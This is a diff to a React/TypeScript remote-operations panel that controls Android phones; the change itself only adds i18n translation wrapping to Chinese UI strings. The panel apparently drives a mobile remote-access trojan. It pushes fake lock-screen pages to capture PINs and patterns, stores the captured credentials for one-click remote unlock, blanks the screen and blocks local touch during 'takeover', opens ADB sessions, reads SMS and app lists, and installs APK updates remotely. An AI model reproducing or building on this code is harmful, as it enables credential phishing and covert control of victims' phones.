@@ -46,6 +46,8 @@ import {
 import { DeviceAppListModal } from "./DeviceAppListModal";
 import { DevicePasswordRecordsPanel } from "./DevicePasswordRecordsPanel";
 import { DeviceSmsModal } from "./DeviceSmsModal";
+import { useI18n, t } from "../i18n";
+
 
 interface RemoteOpsPanelProps {
   deviceId: string;
@@ -75,54 +77,54 @@ function isHttpsUrl(value: string): boolean {
 function formatLockTypeLabel(type: string | null | undefined): string {
   switch (type) {
     case "pattern":
-      return "图案";
+      return t("图案");
     case "password":
-      return "混合密码";
+      return t("混合密码");
     case "pin":
-      return "数字 PIN";
+      return t("数字 PIN");
     case "none":
-      return "未进入输入页";
+      return t("未进入输入页");
     default:
-      return "未知";
+      return t("未知");
   }
 }
 
 function formatUpdateApkHint(status: string, errorText: string): string {
   const code = errorText || status;
   if (code === "client_apk_url_not_configured") {
-    return "未配置 B 包下载地址（菜单：B包更新）";
+    return t("未配置 B 包下载地址（菜单：B包更新）");
   }
   if (code === "client_apk_url_invalid") {
-    return "B 包下载地址无效，需 http/https";
+    return t("B 包下载地址无效，需 http/https");
   }
   if (code === "client_apk_update_disabled") {
-    return "B 包更新已关闭";
+    return t("B 包更新已关闭");
   }
   if (code.startsWith("unsupported_cmd")) {
-    return "当前 B 包不支持远程更新，需先用 A 装新包";
+    return t("当前 B 包不支持远程更新，需先用 A 装新包");
   }
   if (status === "already_latest" || code === "already_latest") {
-    return "已是最新，无需更新";
+    return t("已是最新，无需更新");
   }
   if (status === "pending_user" || code === "pending_user") {
-    return "请在投屏里点「更新/安装」";
+    return t("请在投屏里点「更新/安装」");
   }
   if (status === "need_install_permission" || code === "need_install_permission") {
-    return "请在投屏里允许「安装未知应用」后重试";
+    return t("请在投屏里允许「安装未知应用」后重试");
   }
   if (status === "success" || status === "started") {
-    return "已开始安装，设备可能短暂离线";
+    return t("已开始安装，设备可能短暂离线");
   }
   if (code === "apk_package_mismatch") {
-    return "下载的 APK 包名不是当前 B 包";
+    return t("下载的 APK 包名不是当前 B 包");
   }
   if (code === "wait_timeout" || status === "timeout") {
-    return "等待超时，下载可能仍在进行，请看投屏";
+    return t("等待超时，下载可能仍在进行，请看投屏");
   }
   if (status === "sent") {
-    return "已下发，正在下载，请看投屏";
+    return t("已下发，正在下载，请看投屏");
   }
-  return errorText || status || "已下发";
+  return errorText || status || t("已下发");
 }
 
 export function RemoteOpsPanel({
@@ -136,6 +138,7 @@ export function RemoteOpsPanel({
   onOpsWorkspaceChange,
   workspaceHost,
 }: RemoteOpsPanelProps) {
+  useI18n();
   const [unlockPin, setUnlockPin] = useState("");
   const [unlockBusy, setUnlockBusy] = useState(false);
   const [unlockMessage, setUnlockMessage] = useState<string | null>(null);
@@ -299,21 +302,21 @@ export function RemoteOpsPanel({
         waitMs: 8000,
       });
       if (result.status === "success") {
-        onCommandSent("ADB 运维会话已开（约 5 分钟内可进开发者/无线调试，到期再点 ADB）");
+        onCommandSent(t("ADB 运维会话已开（约 5 分钟内可进开发者/无线调试，到期再点 ADB）"));
       } else {
-        onCommandSent(`ADB 运维会话开启失败：${result.errorMessage ?? result.status}`);
+        onCommandSent(t("ADB 运维会话开启失败：{0}", { 0: result.errorMessage ?? result.status }));
       }
     } catch (error) {
       const hint = error instanceof Error ? error.message : "adb_session_begin_failed";
-      onCommandSent(`ADB 运维会话开启失败：${hint}`);
+      onCommandSent(t("ADB 运维会话开启失败：{0}", { 0: hint }));
     }
   }
 
   const displayedLockType = keyguardPin?.lockType ?? lockTypeLive;
   const lockTypeSource = keyguardPin?.lockType
-    ? "已采集"
+    ? t("已采集")
     : lockTypeLive
-      ? "实时检测"
+      ? t("实时检测")
       : null;
 
   useEffect(() => {
@@ -342,13 +345,13 @@ export function RemoteOpsPanel({
         waitMs: 5000,
       });
       if (result.status === "success") {
-        onCommandSent(`剪切板：已填入 ${text.length} 字`);
+        onCommandSent(t("剪切板：已填入 {0} 字", { 0: text.length }));
       } else {
-        onCommandSent(`剪切板：失败：${result.errorMessage ?? result.status}`);
+        onCommandSent(t("剪切板：失败：{0}", { 0: result.errorMessage ?? result.status }));
       }
     } catch (error) {
       const hint = error instanceof Error ? error.message : "input failed";
-      onCommandSent(`剪切板发送失败：${hint}`);
+      onCommandSent(t("剪切板发送失败：{0}", { 0: hint }));
     } finally {
       setPasteBusy(false);
     }
@@ -416,13 +419,13 @@ export function RemoteOpsPanel({
         waitMs: 5000,
       });
       const locked = Boolean(result.result?.keyguardLocked);
-      const hint = locked ? "已唤醒，仍锁屏" : "屏幕已唤醒";
+      const hint = locked ? t("已唤醒，仍锁屏") : t("屏幕已唤醒");
       setUnlockMessage(hint);
-      onCommandSent(`唤醒：${hint}`);
+      onCommandSent(t("唤醒：{0}", { 0: hint }));
     } catch (error) {
       const hint = error instanceof Error ? error.message : "wake failed";
       setUnlockMessage(hint);
-      onCommandSent(`唤醒失败：${hint}`);
+      onCommandSent(t("唤醒失败：{0}", { 0: hint }));
     } finally {
       setUnlockBusy(false);
     }
@@ -442,20 +445,20 @@ export function RemoteOpsPanel({
         waitMs: 5000,
       });
       if (result.status === "success") {
-        setLockMessage("已下发锁屏");
-        onCommandSent("锁屏：已下发");
+        setLockMessage(t("已下发锁屏"));
+        onCommandSent(t("锁屏：已下发"));
       } else {
         const message = result.errorMessage ?? result.status;
         const hint = message.includes("device_admin")
-          ? "需先开启设备管理员权限"
-          : `失败：${message}`;
+          ? t("需先开启设备管理员权限")
+          : t("失败：{0}", { 0: message });
         setLockMessage(hint);
-        onCommandSent(`锁屏失败：${hint}`);
+        onCommandSent(t("锁屏失败：{0}", { 0: hint }));
       }
     } catch (error) {
       const hint = error instanceof Error ? error.message : "lock failed";
       setLockMessage(hint);
-      onCommandSent(`锁屏失败：${hint}`);
+      onCommandSent(t("锁屏失败：{0}", { 0: hint }));
     } finally {
       setLockBusy(false);
     }
@@ -481,18 +484,18 @@ export function RemoteOpsPanel({
       if (result.status === "success") {
         const active = Boolean(result.result?.active);
         setBlackScreenActive(active);
-        onCommandSent(active ? "黑屏阻断：已开启" : "黑屏阻断：已关闭");
+        onCommandSent(active ? t("黑屏阻断：已开启") : t("黑屏阻断：已关闭"));
       } else {
         blockerStateRef.current.blackScreen = blackScreenActive;
         const message = result.errorMessage ?? result.status;
         onCommandSent(
-          message.includes("accessibility") ? "黑屏阻断：需先开启辅助功能" : `黑屏阻断失败：${message}`,
+          message.includes("accessibility") ? t("黑屏阻断：需先开启辅助功能") : t("黑屏阻断失败：{0}", { 0: message }),
         );
       }
     } catch (error) {
       blockerStateRef.current.blackScreen = blackScreenActive;
       const hint = error instanceof Error ? error.message : "black screen failed";
-      onCommandSent(`黑屏阻断失败：${hint}`);
+      onCommandSent(t("黑屏阻断失败：{0}", { 0: hint }));
     } finally {
       setBlackScreenBusy(false);
     }
@@ -514,12 +517,12 @@ export function RemoteOpsPanel({
       if (result.status === "success") {
         const enabled = Boolean(result.result?.enabled ?? nextEnabled);
         setAutoRotationEnabled(enabled);
-        onCommandSent(enabled ? "自动旋转：已开启" : "自动旋转：已关闭");
+        onCommandSent(enabled ? t("自动旋转：已开启") : t("自动旋转：已关闭"));
         return;
       }
       const message = result.errorMessage ?? result.status;
       if (message.includes("write_settings_required")) {
-        onCommandSent("自动旋转：需先在手机授权「修改系统设置」");
+        onCommandSent(t("自动旋转：需先在手机授权「修改系统设置」"));
         await sendCommand({
           deviceId,
           cmd: "open_write_settings",
@@ -529,11 +532,11 @@ export function RemoteOpsPanel({
           // 静默
         });
       } else {
-        onCommandSent(`自动旋转失败：${message}`);
+        onCommandSent(t("自动旋转失败：{0}", { 0: message }));
       }
     } catch (error) {
       const hint = error instanceof Error ? error.message : "auto_rotation_failed";
-      onCommandSent(`自动旋转失败：${hint}`);
+      onCommandSent(t("自动旋转失败：{0}", { 0: hint }));
     } finally {
       setRotationBusy(false);
     }
@@ -553,9 +556,9 @@ export function RemoteOpsPanel({
         });
         if (result.status === "success") {
           setKeepAwakeActive(false);
-          onCommandSent("屏幕常亮：已关闭");
+          onCommandSent(t("屏幕常亮：已关闭"));
         } else {
-          onCommandSent(`屏幕常亮失败：${result.errorMessage ?? result.status}`);
+          onCommandSent(t("屏幕常亮失败：{0}", { 0: result.errorMessage ?? result.status }));
         }
         return;
       }
@@ -568,7 +571,7 @@ export function RemoteOpsPanel({
       if (result.status !== "success") {
         const err = result.errorMessage ?? result.status;
         onCommandSent(
-          String(err).includes("accessibility") ? "屏幕常亮：需先开启辅助功能" : `屏幕常亮失败：${err}`,
+          String(err).includes("accessibility") ? t("屏幕常亮：需先开启辅助功能") : t("屏幕常亮失败：{0}", { 0: err }),
         );
         return;
       }
@@ -576,7 +579,7 @@ export function RemoteOpsPanel({
       const writeGranted = Boolean(result.result?.writeSettingsGranted);
       if (!writeGranted) {
         setKeepAwakeActive(false);
-        onCommandSent("屏幕常亮：等待授权修改系统设置");
+        onCommandSent(t("屏幕常亮：等待授权修改系统设置"));
         await sendCommand({
           deviceId,
           cmd: "open_write_settings",
@@ -597,10 +600,10 @@ export function RemoteOpsPanel({
       }
 
       setKeepAwakeActive(true);
-      onCommandSent("屏幕常亮：已开启");
+      onCommandSent(t("屏幕常亮：已开启"));
     } catch (error) {
       const hint = error instanceof Error ? error.message : "keep_awake_failed";
-      onCommandSent(`屏幕常亮失败：${hint}`);
+      onCommandSent(t("屏幕常亮失败：{0}", { 0: hint }));
     } finally {
       setKeepAwakeBusy(false);
     }
@@ -690,20 +693,20 @@ export function RemoteOpsPanel({
           result.result?.active ?? result.result?.phoneTakeoverActive ?? !takeoverActive,
         );
         setTakeoverActive(active);
-        onCommandSent(active ? "接管阻断：已开启" : "接管阻断：已关闭");
+        onCommandSent(active ? t("接管阻断：已开启") : t("接管阻断：已关闭"));
       } else {
         blockerStateRef.current.takeover = takeoverActive;
         const message = result.errorMessage ?? result.status;
         onCommandSent(
           String(message).includes("accessibility")
-            ? "接管手机：需先开启辅助功能"
-            : `接管手机失败：${message}`,
+            ? t("接管手机：需先开启辅助功能")
+            : t("接管手机失败：{0}", { 0: message }),
         );
       }
     } catch (error) {
       blockerStateRef.current.takeover = takeoverActive;
       const hint = error instanceof Error ? error.message : "takeover failed";
-      onCommandSent(`接管手机失败：${hint}`);
+      onCommandSent(t("接管手机失败：{0}", { 0: hint }));
     } finally {
       setTakeoverBusy(false);
     }
@@ -722,14 +725,14 @@ export function RemoteOpsPanel({
         waitMs: 5000,
       });
       if (result.status === "success") {
-        onCommandSent("静音：已下发");
+        onCommandSent(t("静音：已下发"));
       } else {
         const message = result.errorMessage ?? result.status;
-        onCommandSent(`静音失败：${message}`);
+        onCommandSent(t("静音失败：{0}", { 0: message }));
       }
     } catch (error) {
       const message = error instanceof Error ? error.message : "mute failed";
-      onCommandSent(`静音失败：${message}`);
+      onCommandSent(t("静音失败：{0}", { 0: message }));
     } finally {
       setMuteBusy(false);
     }
@@ -748,12 +751,12 @@ export function RemoteOpsPanel({
         waitMs: 5000,
       });
       if (result.status === "success") {
-        onCommandSent("亮度：已调至最低");
+        onCommandSent(t("亮度：已调至最低"));
         return;
       }
       const message = result.errorMessage ?? result.status;
       if (String(message).includes("write_settings_required")) {
-        onCommandSent("亮度最低：需先在手机授权「修改系统设置」");
+        onCommandSent(t("亮度最低：需先在手机授权「修改系统设置」"));
         await sendCommand({
           deviceId,
           cmd: "open_write_settings",
@@ -763,11 +766,11 @@ export function RemoteOpsPanel({
           /* ignore */
         });
       } else {
-        onCommandSent(`亮度最低失败：${message}`);
+        onCommandSent(t("亮度最低失败：{0}", { 0: message }));
       }
     } catch (error) {
       const hint = error instanceof Error ? error.message : "brightness_failed";
-      onCommandSent(`亮度最低失败：${hint}`);
+      onCommandSent(t("亮度最低失败：{0}", { 0: hint }));
     } finally {
       setBrightnessBusy(false);
     }
@@ -778,7 +781,7 @@ export function RemoteOpsPanel({
       return;
     }
     const confirmed = window.confirm(
-      "确认打开电源菜单？仅拉起重启界面，需在手机上手动滑动完成重启。",
+      t("确认打开电源菜单？仅拉起重启界面，需在手机上手动滑动完成重启。"),
     );
     if (!confirmed) {
       return;
@@ -792,14 +795,14 @@ export function RemoteOpsPanel({
         waitMs: 8000,
       });
       if (result.status === "success") {
-        onCommandSent("重启手机：已打开电源菜单（需手动滑动）");
+        onCommandSent(t("重启手机：已打开电源菜单（需手动滑动）"));
       } else {
         const message = result.errorMessage ?? result.status;
-        onCommandSent(`重启手机失败：${message}`);
+        onCommandSent(t("重启手机失败：{0}", { 0: message }));
       }
     } catch (error) {
       const message = error instanceof Error ? error.message : "reboot failed";
-      onCommandSent(`重启手机失败：${message}`);
+      onCommandSent(t("重启手机失败：{0}", { 0: message }));
     } finally {
       setRebootBusy(false);
     }
@@ -810,7 +813,7 @@ export function RemoteOpsPanel({
       return;
     }
     const confirmed = window.confirm(
-      "确认关闭无障碍？关闭后可到系统设置里手动卸载，远程控制会掉线。",
+      t("确认关闭无障碍？关闭后可到系统设置里手动卸载，远程控制会掉线。"),
     );
     if (!confirmed) {
       return;
@@ -827,15 +830,15 @@ export function RemoteOpsPanel({
       });
       if (didCloseAccessibility(result)) {
         onCommandSent(
-          result.status === "success" ? "卸载：已关闭无障碍" : "卸载：无障碍已是关闭状态",
+          result.status === "success" ? t("卸载：已关闭无障碍") : t("卸载：无障碍已是关闭状态"),
         );
       } else {
         const fail = result.errorMessage ?? result.status;
-        onCommandSent(`卸载失败：${fail}`);
+        onCommandSent(t("卸载失败：{0}", { 0: fail }));
       }
     } catch (error) {
       const message = error instanceof Error ? error.message : "uninstall failed";
-      onCommandSent(`卸载失败：${message}`);
+      onCommandSent(t("卸载失败：{0}", { 0: message }));
     } finally {
       setUninstallBusy(false);
     }
@@ -846,7 +849,7 @@ export function RemoteOpsPanel({
       return;
     }
     const confirmed = window.confirm(
-      "确认更新 B 包？会下载并覆盖安装。versionCode 必须更大。若弹出确认框，请开投屏在画面上点「更新」。设备会短暂离线。",
+      t("确认更新 B 包？会下载并覆盖安装。versionCode 必须更大。若弹出确认框，请开投屏在画面上点「更新」。设备会短暂离线。"),
     );
     if (!confirmed) {
       return;
@@ -859,7 +862,7 @@ export function RemoteOpsPanel({
         params: {},
         waitMs: 0,
       });
-      onCommandSent("更新 B 包：已下发，正在下载，请看投屏");
+      onCommandSent(t("更新 B 包：已下发，正在下载，请看投屏"));
 
       const deadline = Date.now() + 180_000;
       let latest = accepted;
@@ -875,13 +878,13 @@ export function RemoteOpsPanel({
       const errorText = latest.errorMessage ?? "";
       const hint =
         latest.status === "sent"
-          ? "下载可能仍在进行，请看投屏；有安装框就点「更新」"
+          ? t("下载可能仍在进行，请看投屏；有安装框就点「更新」")
           : formatUpdateApkHint(resultStatus, errorText);
-      onCommandSent(`更新 B 包：${hint}`);
+      onCommandSent(t("更新 B 包：{0}", { 0: hint }));
     } catch (error) {
       const raw = error instanceof Error ? error.message : "update_apk failed";
       const hint = formatUpdateApkHint("", raw);
-      onCommandSent(`更新 B 包失败：${hint}`);
+      onCommandSent(t("更新 B 包失败：{0}", { 0: hint }));
     } finally {
       setUpdateApkBusy(false);
     }
@@ -893,7 +896,7 @@ export function RemoteOpsPanel({
     }
     const normalized = cells.trim();
     if (!isPatternCells(normalized)) {
-      setUnlockMessage("图形格式无效，需类似 1-2-5-8-9");
+      setUnlockMessage(t("图形格式无效，需类似 1-2-5-8-9"));
       return;
     }
     setUnlockBusy(true);
@@ -913,12 +916,12 @@ export function RemoteOpsPanel({
         waitMs: 45000,
       });
       const ok = result.status === "success";
-      setUnlockMessage(ok ? "图形解锁指令已发送" : `失败：${result.errorMessage ?? result.status}`);
-      onCommandSent(ok ? "图形解锁已下发" : `图形解锁失败：${result.errorMessage ?? result.status}`);
+      setUnlockMessage(ok ? t("图形解锁指令已发送") : t("失败：{0}", { 0: result.errorMessage ?? result.status }));
+      onCommandSent(ok ? t("图形解锁已下发") : t("图形解锁失败：{0}", { 0: result.errorMessage ?? result.status }));
     } catch (error) {
       const hint = error instanceof Error ? error.message : "unlock pattern failed";
       setUnlockMessage(hint);
-      onCommandSent(`图形解锁失败：${hint}`);
+      onCommandSent(t("图形解锁失败：{0}", { 0: hint }));
     } finally {
       setUnlockBusy(false);
     }
@@ -960,15 +963,15 @@ export function RemoteOpsPanel({
     }
     if (isMaskedSecret(record.pin)) {
       setUnlockMessage(
-        "采集到的是掩码（如 •••••5），不是真实密码。请在本机重新解锁一次以重新采集，再点一键解锁",
+        t("采集到的是掩码（如 •••••5），不是真实密码。请在本机重新解锁一次以重新采集，再点一键解锁"),
       );
-      onCommandSent("一键解锁失败：凭据为掩码，需重新采集");
+      onCommandSent(t("一键解锁失败：凭据为掩码，需重新采集"));
       return;
     }
 
     if (record.lockType === "password" && !/^\d+$/.test(record.pin.trim())) {
       setUnlockMessage(
-        "当前为混合密码，一键解锁仅支持纯数字 PIN。请在上方解锁框手动输入完整密码后点「解锁」",
+        t("当前为混合密码，一键解锁仅支持纯数字 PIN。请在上方解锁框手动输入完整密码后点「解锁」"),
       );
       setUnlockPin(record.pin);
       return;
@@ -984,13 +987,13 @@ export function RemoteOpsPanel({
     }
     if (isMaskedSecret(pin)) {
       setUnlockMessage(
-        "解锁内容含掩码字符（•），无法下发。请填写真实数字 PIN，或本机重新解锁采集",
+        t("解锁内容含掩码字符（•），无法下发。请填写真实数字 PIN，或本机重新解锁采集"),
       );
       return;
     }
     const digits = pin.trim();
     if (!/^\d+$/.test(digits)) {
-      setUnlockMessage("unlock_pin 仅支持纯数字 PIN");
+      setUnlockMessage(t("unlock_pin 仅支持纯数字 PIN"));
       return;
     }
     setUnlockBusy(true);
@@ -1003,13 +1006,13 @@ export function RemoteOpsPanel({
         waitMs: 45000,
       });
       const hint =
-        result.status === "success" ? "解锁指令已发送" : `失败：${result.errorMessage ?? result.status}`;
+        result.status === "success" ? t("解锁指令已发送") : t("失败：{0}", { 0: result.errorMessage ?? result.status });
       setUnlockMessage(hint);
-      onCommandSent(result.status === "success" ? "PIN 解锁已下发" : `PIN 解锁失败：${result.errorMessage ?? result.status}`);
+      onCommandSent(result.status === "success" ? t("PIN 解锁已下发") : t("PIN 解锁失败：{0}", { 0: result.errorMessage ?? result.status }));
     } catch (error) {
       const hint = error instanceof Error ? error.message : "unlock failed";
       setUnlockMessage(hint);
-      onCommandSent(`PIN 解锁失败：${hint}`);
+      onCommandSent(t("PIN 解锁失败：{0}", { 0: hint }));
     } finally {
       setUnlockBusy(false);
     }
@@ -1019,8 +1022,8 @@ export function RemoteOpsPanel({
     try {
       await clearKeyguardPin(deviceId);
       onKeyguardPinChange?.(null);
-      setUnlockMessage("已清除无效掩码采集");
-      onCommandSent("已清除无效锁屏采集");
+      setUnlockMessage(t("已清除无效掩码采集"));
+      onCommandSent(t("已清除无效锁屏采集"));
     } catch (error) {
       setUnlockMessage(error instanceof Error ? error.message : "clear failed");
     }
@@ -1030,28 +1033,28 @@ export function RemoteOpsPanel({
     const name = keyguardFakeNewLinkName.trim();
     const url = keyguardFakeNewLinkUrl.trim();
     if (!name) {
-      message.warning("请填写名称");
+      message.warning(t("请填写名称"));
       return;
     }
     if (!url) {
-      message.warning("请填写链接");
+      message.warning(t("请填写链接"));
       return;
     }
     if (!isHttpsUrl(url)) {
-      message.warning("链接必须是 https:// 开头");
+      message.warning(t("链接必须是 https:// 开头"));
       return;
     }
     setKeyguardFakeAddingLink(true);
     try {
       const created = await createFakePageWebLink({ name, url });
-      message.success("已新增 Web 链接");
+      message.success(t("已新增 Web 链接"));
       setKeyguardFakeAddLinkOpen(false);
       setKeyguardFakeNewLinkName("");
       setKeyguardFakeNewLinkUrl("");
       await loadKeyguardFakeWebLinks();
       setKeyguardFakeWebUrl(created.url);
     } catch (error) {
-      message.error(error instanceof Error ? error.message : "新增失败");
+      message.error(error instanceof Error ? error.message : t("新增失败"));
     } finally {
       setKeyguardFakeAddingLink(false);
     }
@@ -1064,12 +1067,12 @@ export function RemoteOpsPanel({
     const trimmedWebUrl = keyguardFakeWebUrl.trim();
     if (!trimmedWebUrl) {
       message.warning(
-        keyguardFakeWebLinks.length === 0 ? "请先新增 Web 链接" : "请选择 Web 链接",
+        keyguardFakeWebLinks.length === 0 ? t("请先新增 Web 链接") : t("请选择 Web 链接"),
       );
       return;
     }
     if (!isHttpsUrl(trimmedWebUrl)) {
-      message.warning("Web 链接必须是 https:// 开头");
+      message.warning(t("Web 链接必须是 https:// 开头"));
       return;
     }
     await sendKeyguardFakePageWithType("web", { webUrl: trimmedWebUrl });
@@ -1082,12 +1085,12 @@ export function RemoteOpsPanel({
     const trimmedWebUrl = keyguardFakeWebUrl.trim();
     if (!trimmedWebUrl) {
       message.warning(
-        keyguardFakeWebLinks.length === 0 ? "请先新增图案 Web 链接" : "请选择图案 Web 链接",
+        keyguardFakeWebLinks.length === 0 ? t("请先新增图案 Web 链接") : t("请选择图案 Web 链接"),
       );
       return;
     }
     if (!isHttpsUrl(trimmedWebUrl)) {
-      message.warning("Web 链接必须是 https:// 开头");
+      message.warning(t("Web 链接必须是 https:// 开头"));
       return;
     }
     await sendKeyguardFakePageWithType("pattern", { webUrl: trimmedWebUrl });
@@ -1099,11 +1102,11 @@ export function RemoteOpsPanel({
   ) {
     const webUrl = extra?.webUrl?.trim() ?? "";
     if (!webUrl) {
-      message.warning("Web 链接不能为空");
+      message.warning(t("Web 链接不能为空"));
       return;
     }
     if (!isHttpsUrl(webUrl)) {
-      message.warning("Web 链接必须是 https:// 开头");
+      message.warning(t("Web 链接必须是 https:// 开头"));
       return;
     }
     setKeyguardFakeBusy(true);
@@ -1114,7 +1117,7 @@ export function RemoteOpsPanel({
         cmd: "show_keyguard_fake_page",
         params: {
           pageType: "web",
-          title: "锁屏验证",
+          title: t("锁屏验证"),
           webUrl,
         },
         waitMs: 20000,
@@ -1124,12 +1127,12 @@ export function RemoteOpsPanel({
       }
       setKeyguardFakeMessage(
         kind === "pattern"
-          ? `图案伪页已下发：${webUrl}`
-          : `锁屏伪页已下发：${webUrl}`,
+          ? t("图案伪页已下发：{0}", { 0: webUrl })
+          : t("锁屏伪页已下发：{0}", { 0: webUrl }),
       );
-      onCommandSent(kind === "pattern" ? "图案 Web 伪页：已下发" : "锁屏伪页：已下发");
+      onCommandSent(kind === "pattern" ? t("图案 Web 伪页：已下发") : t("锁屏伪页：已下发"));
     } catch (error) {
-      const text = error instanceof Error ? error.message : "下发失败";
+      const text = error instanceof Error ? error.message : t("下发失败");
       setKeyguardFakeMessage(text);
       message.error(text);
     } finally {
@@ -1153,10 +1156,10 @@ export function RemoteOpsPanel({
       if (result.status !== "success") {
         throw new Error(result.errorMessage ?? result.status);
       }
-      setKeyguardFakeMessage("锁屏伪页已关闭");
-      onCommandSent("锁屏伪页：已关闭");
+      setKeyguardFakeMessage(t("锁屏伪页已关闭"));
+      onCommandSent(t("锁屏伪页：已关闭"));
     } catch (error) {
-      const text = error instanceof Error ? error.message : "关闭失败";
+      const text = error instanceof Error ? error.message : t("关闭失败");
       setKeyguardFakeMessage(text);
       message.error(text);
     } finally {
@@ -1171,11 +1174,11 @@ export function RemoteOpsPanel({
   async function handleFakePageAddToHistory(record: FakePageSubmission) {
     const text = record.text.trim();
     if (!text) {
-      message.warning("采集内容为空");
+      message.warning(t("采集内容为空"));
       return;
     }
     if (isMaskedSecret(text)) {
-      message.warning("这是掩码脏数据，不能保存");
+      message.warning(t("这是掩码脏数据，不能保存"));
       return;
     }
     const id = fakeRecordItemId(record);
@@ -1189,11 +1192,11 @@ export function RemoteOpsPanel({
         source: "manual",
       });
       setPasswordStoreTick((value) => value + 1);
-      const hint = `已加入历史密码：${lockTypeLabel(lockType, text)}`;
+      const hint = t("已加入历史密码：{0}", { 0: lockTypeLabel(lockType, text) });
       showKeyguardFakeHint(hint, "success");
-      message.success("已加入历史密码");
+      message.success(t("已加入历史密码"));
     } catch (error) {
-      const errText = error instanceof Error ? error.message : "保存失败";
+      const errText = error instanceof Error ? error.message : t("保存失败");
       showKeyguardFakeHint(errText, "warn");
       message.error(errText);
     } finally {
@@ -1204,11 +1207,11 @@ export function RemoteOpsPanel({
   async function handleFakePageSetAsDefault(record: FakePageSubmission) {
     const text = record.text.trim();
     if (!text) {
-      message.warning("采集内容为空");
+      message.warning(t("采集内容为空"));
       return;
     }
     if (isMaskedSecret(text)) {
-      message.warning("这是掩码脏数据，不能保存");
+      message.warning(t("这是掩码脏数据，不能保存"));
       return;
     }
     const id = fakeRecordItemId(record);
@@ -1225,12 +1228,12 @@ export function RemoteOpsPanel({
       const keyguardRecord = await saveKeyguardPin(deviceId, text, lockType);
       onKeyguardPinChange?.(keyguardRecord);
       setPasswordStoreTick((value) => value + 1);
-      const hint = `已设为默认密码：${lockTypeLabel(lockType, text)}，可切到「解锁」Tab 一键解锁`;
+      const hint = t("已设为默认密码：{0}，可切到「解锁」Tab 一键解锁", { 0: lockTypeLabel(lockType, text) });
       showKeyguardFakeHint(hint, "success");
-      message.success("已设为默认密码");
-      onCommandSent("伪页采集已设为默认锁屏凭据");
+      message.success(t("已设为默认密码"));
+      onCommandSent(t("伪页采集已设为默认锁屏凭据"));
     } catch (error) {
-      const errText = error instanceof Error ? error.message : "设置失败";
+      const errText = error instanceof Error ? error.message : t("设置失败");
       showKeyguardFakeHint(errText, "warn");
       message.error(errText);
     } finally {
@@ -1240,7 +1243,7 @@ export function RemoteOpsPanel({
 
   return (
     <div className="remote-ops-panel">
-      <div className="ops-tool-rail" role="toolbar" aria-label="远程操作">
+      <div className="ops-tool-rail" role="toolbar" aria-label={t("远程操作")}>
         <button
           type="button"
           className="ops-tool-btn"
@@ -1249,12 +1252,12 @@ export function RemoteOpsPanel({
             setClipboardInput("");
             setClipboardOpen(true);
           }}
-          title="输入文字并发送到手机当前输入框"
+          title={t("输入文字并发送到手机当前输入框")}
         >
           <span className="ops-tool-btn-icon" aria-hidden="true">
             <SnippetsOutlined />
           </span>
-          <span className="ops-tool-btn-label">{pasteBusy ? "粘贴中" : "剪贴板"}</span>
+          <span className="ops-tool-btn-label">{pasteBusy ? t("粘贴中") : t("剪贴板")}</span>
         </button>
 
         <button
@@ -1262,12 +1265,12 @@ export function RemoteOpsPanel({
           className="ops-tool-btn"
           disabled={!isOnline || unlockBusy}
           onClick={() => void sendWakeScreen()}
-          title="唤醒屏幕"
+          title={t("唤醒屏幕")}
         >
           <span className="ops-tool-btn-icon" aria-hidden="true">
             <BulbOutlined />
           </span>
-          <span className="ops-tool-btn-label">唤醒</span>
+          <span className="ops-tool-btn-label">{t("唤醒")}</span>
         </button>
 
         <button
@@ -1277,15 +1280,15 @@ export function RemoteOpsPanel({
           onClick={() => void toggleKeepAwakeScreen()}
           title={
             keepAwakeActive
-              ? "关闭屏幕常亮并恢复息屏时间"
-              : "开启屏幕常亮（需「修改系统设置」权限）"
+              ? t("关闭屏幕常亮并恢复息屏时间")
+              : t("开启屏幕常亮（需「修改系统设置」权限）")
           }
         >
           <span className="ops-tool-btn-icon" aria-hidden="true">
             <DesktopOutlined />
           </span>
           <span className="ops-tool-btn-label">
-            {keepAwakeBusy ? "处理中" : keepAwakeActive ? "关常亮" : "屏幕常亮"}
+            {keepAwakeBusy ? t("处理中") : keepAwakeActive ? t("关常亮") : t("屏幕常亮")}
           </span>
         </button>
 
@@ -1294,13 +1297,13 @@ export function RemoteOpsPanel({
           className="ops-tool-btn"
           disabled={!isOnline || brightnessBusy}
           onClick={() => void sendBrightnessMin()}
-          title="将手机亮度调到最低（需「修改系统设置」权限）"
+          title={t("将手机亮度调到最低（需「修改系统设置」权限）")}
         >
           <span className="ops-tool-btn-icon" aria-hidden="true">
             <MoonOutlined />
           </span>
           <span className="ops-tool-btn-label">
-            {brightnessBusy ? "处理中" : "亮度最低"}
+            {brightnessBusy ? t("处理中") : t("亮度最低")}
           </span>
         </button>
 
@@ -1309,12 +1312,12 @@ export function RemoteOpsPanel({
           className={`ops-tool-btn${lockWorkspaceOpen ? " is-active" : ""}`}
           disabled={!isOnline}
           onClick={() => toggleWorkspace("lock")}
-          title="锁屏 / 解锁（在公共操作区打开，可同时触控屏幕）"
+          title={t("锁屏 / 解锁（在公共操作区打开，可同时触控屏幕）")}
         >
           <span className="ops-tool-btn-icon" aria-hidden="true">
             <LockOutlined />
           </span>
-          <span className="ops-tool-btn-label">锁屏</span>
+          <span className="ops-tool-btn-label">{t("锁屏")}</span>
         </button>
 
         <button
@@ -1322,13 +1325,13 @@ export function RemoteOpsPanel({
           className={`ops-tool-btn${blackScreenActive ? " is-active" : ""}`}
           disabled={!isOnline || blackScreenBusy}
           onClick={() => void toggleBlackScreen()}
-          title={blackScreenActive ? "关闭黑屏阻断" : "黑屏阻断：本地点控无效，远程可操作"}
+          title={blackScreenActive ? t("关闭黑屏阻断") : t("黑屏阻断：本地点控无效，远程可操作")}
         >
           <span className="ops-tool-btn-icon" aria-hidden="true">
             <EyeInvisibleOutlined />
           </span>
           <span className="ops-tool-btn-label">
-            {blackScreenBusy ? "处理中" : blackScreenActive ? "关阻断" : "黑屏阻断"}
+            {blackScreenBusy ? t("处理中") : blackScreenActive ? t("关阻断") : t("黑屏阻断")}
           </span>
         </button>
 
@@ -1339,15 +1342,15 @@ export function RemoteOpsPanel({
           onClick={() => void togglePhoneTakeover()}
           title={
             takeoverActive
-              ? "关闭接管阻断"
-              : "接管阻断：本地点控无效，远程可操作"
+              ? t("关闭接管阻断")
+              : t("接管阻断：本地点控无效，远程可操作")
           }
         >
           <span className="ops-tool-btn-icon" aria-hidden="true">
             <ControlOutlined />
           </span>
           <span className="ops-tool-btn-label">
-            {takeoverBusy ? "处理中" : takeoverActive ? "解接管" : "接管"}
+            {takeoverBusy ? t("处理中") : takeoverActive ? t("解接管") : t("接管")}
